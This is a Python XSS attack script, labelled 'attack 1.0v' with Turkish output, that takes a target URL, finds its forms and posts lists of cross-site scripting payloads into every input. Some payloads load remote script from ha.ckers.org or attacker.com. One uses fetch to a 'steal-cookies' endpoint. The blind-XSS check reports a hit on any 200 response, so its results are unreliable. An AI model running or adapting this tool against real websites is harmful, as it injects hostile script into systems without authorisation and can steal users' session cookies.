import os
import time
import requests
from bs4 import BeautifulSoup
from colorama import Fore

def xss_scan(url):
    os.system("clear")
    print(Fore.RED + """
 ██╗  ██╗███████╗███████╗
 ╚██╗██╔╝██╔════╝██╔════╝
  ╚███╔╝ ███████╗███████╗
  ██╔██╗ ╚════██║╚════██║ attack 1.0v
 ██╔╝ ██╗███████║███████║
 ╚═╝  ╚═╝╚══════╝╚══════╝
""")
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(Fore.YELLOW + f"{url} adresi başarıyla tarandı!")
            print(Fore.RED + "")
            time.sleep(4)
            soup = BeautifulSoup(response.content, 'html.parser')
            forms = soup.find_all('form')

            for form in forms:
                print(f"Form bulundu: {form}")
                stored_xss_test(soup, url)
                reflected_xss_test(form, url)
                dom_based_xss_test(form, url)
                blind_xss_test(form, url)

        else:
            print(f"URL'ye bağlanırken bir hata oluştu. Durum kodu: {response.status_code}")

    except Exception as e:
        print(f"XSS taraması sırasında bir hata oluştu: {e}")

def stored_xss_test(soup, url):
    stored_xss_payloads = [
        '<script>alert("Stored XSS Attack")</script>',
        '<img src="x" onerror="alert(\'Stored XSS Attack\')" />',
        '<svg onload="alert(\'Stored XSS Attack\')"></svg>',
        '<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>',
        '<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">',
        '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">',
        '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
        '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
        '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
        '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
        '<IMG SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmci>',
        '<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>',
    ]

    for payload in stored_xss_payloads:
        if payload in soup.text:
            print(f"Stored XSS zafiyeti bulundu: {url} - Payload: {payload}")

def reflected_xss_test(form, url):
    reflected_xss_payloads = [
        '<script>alert("Reflected XSS Attack")</script>',
        '<img src="x" onerror="alert(\'Reflected XSS Attack\')" />',
        '<svg onload="alert(\'Reflected XSS Attack\')"></svg>',
        '<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
        '<A HREF="http://66.102.7.147/">XSS</A>',
        '<input/onmouseover="javaSCRIPT:confirm(1)">',
        '<sVg><scRipt %00>alert(1) {Opera}',
        '<img/src=%00 onerror=this.onerror=confirm(1)>',
    ]

    for payload in reflected_xss_payloads:
        for input_field in form.find_all('input'):
            input_field['value'] = payload
            form_data = {input_field['name']: input_field['value'] for input_field in form.find_all('input')}
            try:
                response = requests.post(url, data=form_data)
                if payload in response.text:
                    print(f"Reflected XSS zafiyeti bulundu: {url} - Payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"Post isteği sırasında hata oluştu: {e}")

def dom_based_xss_test(form, url):
    dom_based_xss_payloads = [
        '<script>document.write("DOM-based XSS Attack")</script>',
        '<img src="x" onerror="alert(\'DOM-based XSS Attack\')" />',
        '<svg onload="alert(\'DOM-based XSS Attack\')"></svg>'
    ]

    for payload in dom_based_xss_payloads:
        for input_field in form.find_all('input'):
            input_field['value'] = payload
            form_data = {input_field['name']: input_field['value'] for input_field in form.find_all('input')}
            try:
                response = requests.post(url, data=form_data)
                if payload in response.text:
                    print(f"DOM-based XSS zafiyeti bulundu: {url} - Payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"Post isteği sırasında hata oluştu: {e}")

def blind_xss_test(form, url):
    blind_xss_payloads = [
        '<img src="x" onerror="alert(\'Blind XSS Attack\')" />',
        '<script src="https://attacker.com/malicious.js"></script>',
        '<svg><script>fetch("https://attacker.com/steal-cookies")</script></svg>'
    ]

    for payload in blind_xss_payloads:
        for input_field in form.find_all('input'):
            input_field['value'] = payload
            form_data = {input_field['name']: input_field['value'] for input_field in form.find_all('input')}
            try:
                response = requests.post(url, data=form_data)
                if response.status_code == 200:
                    print(f"Blind XSS zafiyeti bulundu: {url} - Payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"Post isteği sırasında hata oluştu: {e}")

if __name__ == "__main__":
    target_url = input("Hedef URL'yi girin: ")
    xss_scan(target_url)
